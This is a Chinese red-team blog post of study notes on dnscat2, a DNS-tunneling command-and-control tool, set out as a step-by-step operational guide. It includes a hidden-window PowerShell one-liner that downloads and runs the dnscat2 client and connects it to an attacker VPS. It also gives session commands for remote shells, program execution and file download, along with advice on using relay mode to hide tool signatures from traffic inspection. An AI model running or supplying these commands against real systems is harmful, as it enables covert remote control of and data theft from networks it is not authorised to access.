---
title: 【内网学习笔记】dnscat2 使用
date: 2021-06-08 15:02:24
id: 210608-150224
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_14-35-33.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

# 0x00 介绍

dnscat2 是一款 C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C2 通道。

dnacat2 的客户端由 C 语言编写，服务端由 Ruby 语言编写，在攻击主机上开启服务端后，客户端放到目标主机上执行相关命令，攻击主机就能够收到来自客户端的会话了。

dnscat2 有两种使用模式，一是直连模式，二是中继模式，区别如下：

直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求

中继模式：像平时上网一样，DNS 先经过互联网的解析，最终指向我们的恶意 DNS 服务器，与直连模式相比速度较慢但是更安全。

在安全策略做的比较严格的内网中，如果发现只允许白名单流量出站，而且内网中还有诸多安全设备，同时在传统的 C2 通信无法建立的情况下，RT 就可以尝试使用 DNS 协议建立 C2 通信。

# 0x01 安装

## 1、服务端

这里以 Ubuntu 为例

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
bundle install
```

如果运行 `sudo gem install bundler` 提示 `Command 'gem' not found`，则需要先安装 ruby 

```
sudo apt-get install ruby
```

如果运行 `bundle install` 提示 `Gem::Ext::BuildError: ERROR: Failed to build gem native extension.`，则需要先安装 ruby-dev

```
sudo apt-get install ruby-dev
```

## 2、客户端

dnscat2 客户端在使用前需要进行编译才能使用，在 Windows 中可以使用 VS 进行编译或者直接使用 PowerShell 的版本，Linux 中可以使用 `make install` 进行编译。

Linux 下可以通过以下方法进行编译

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```

Windows 可以直接下载已经编译好的版本

exe 版（解压密码：password）：[https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip](https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip)

PowerShell 版：[https://github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)

如果使用 PowerShell 版，可以直接使用下面的命令导入，在实际情况中，也更推荐使用 PowerShell 版的，毕竟隐蔽性要更好些。

```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
```

或者下载 ps1 文件后，使用以下命令导入

```
Import-Module .\dnscat2.ps1
```

# 0x02 使用

## 1、直连模式

**启动服务端**，这里服务端 IP 为 172.16.214.50

```
cd /dnscat2/server
sudo ruby ./dnscat2.rb -s 553 -c teamssix --no-cache
```

```
-s 指定 dns 服务端口
-c 指定连接密码
--no-cache 禁止缓存，添加该项为了使和 PowerShell 版本的 dnscat2 兼容
```

**启动客户端**，这里以 Windows 下的 exe 版为例

```
dnscat --dns server=172.16.214.50,port=553 --secret=teamssix
```

连接成功后，会提示 `Session established!`

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_16-44-12.png)

dnscat2 的一些命令

```
sessions 或 windows 						查看当前会话
session -i 1 或 window -i 1 		进入 ID 为 1 的会话
shell 					建立交互式会话
exec						远程打开程序
download			  下载文件
help						查看支持的命令
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/WX20210607-165615@2x.png)

抓下包，看看流量是什么样子的

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-01-52.png)

不难看出，流量中有很多 dnscat 的字样，这样一来，虽然使用了 dns 协议，但是隐蔽性还是差了不少，接下来看看中继模式。

## 2、中继模式

在中继模式下，需要自己有一个域名，并添加两条域名解析记录。

首先创建一条 A 记录指向自己的公网 VPS 地址，之后创建一条 ns 记录指向 A 记录的子域名，示例如下：

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-20-20.png)

如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。

A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。

```
nslookup ns1.teamssix.com
```

ns 记录：在公网 VPS 上开启抓包，再`nslookup dc.teamssix.com`，如果在 VPS 上看到对应的流量记录，说明该项配置正确。

```
sudo tcpdump -n -i eth0 udp dst port 53
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_13-46-54.png)

**开启服务端**

```
sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open
```

```
-e 指定安全级别，open 表示服务端允许客户端不进行加密
```

如果提示`Address already in use - bind(2) for "0.0.0.0" port 53`，可以关闭`systemd-resolved`

```
sudo systemctl stop systemd-resolved
```

**开启客户端**，这里以 Windows 下的 PowerShell 版为例

```
start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip
```

也可以把导入的命令和开启客户端的命令放在一起

```
powershell.exe -nop -w hidden -c {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip}
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_14-35-33.png)

再来抓下包，看看流量是什么样的

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_14-45-40.png)

可以看出，流量中已经没有了 dnscat 的字样，这也是为什么在介绍部分说中继模式比直连模式更安全的原因。

> 参考文章：
>
> [https://xz.aliyun.com/t/2214](https://xz.aliyun.com/t/2214)
>
> [https://blog.csdn.net/localhost01/article/details/86591685](https://blog.csdn.net/localhost01/article/details/86591685)
>
> [https://blog.csdn.net/qq_36119192/article/details/104429983](https://blog.csdn.net/qq_36119192/article/details/104429983)
> 
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
